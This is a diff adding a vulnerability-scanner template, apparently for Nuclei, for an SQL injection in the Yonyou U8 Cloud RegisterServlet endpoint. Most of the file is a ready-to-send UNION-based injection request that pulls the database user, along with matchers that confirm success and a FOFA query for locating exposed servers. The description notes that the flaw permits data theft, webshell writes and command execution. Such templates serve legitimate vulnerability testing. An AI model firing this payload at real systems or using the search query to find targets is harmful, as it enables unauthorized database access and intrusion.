@@ -1,0 +1,26 @@
+id: Yonyou-U8-Cloud-RegisterServlet-sqli
+
+info:
+  name: 用友U8-nc.bs.sm.login2.RegisterServlet SQL注入漏洞
+  author: linfeng7z
+  severity: critical
+  description: 用友U8 Cloud nc.bs.sm.login2.RegisterServlet接口存在SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  metadata:
+    fofa-qeury: app="用友-U8-Cloud"
+    veified: true
+  tags: Yonyou,yonyou,u8,U8,sqli
+
+http:
+  - raw:
+      - |
+        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,(USER),NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        X-Forwarded-For: 127.0.0.1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'invalid UFDate:')"
+        condition: and
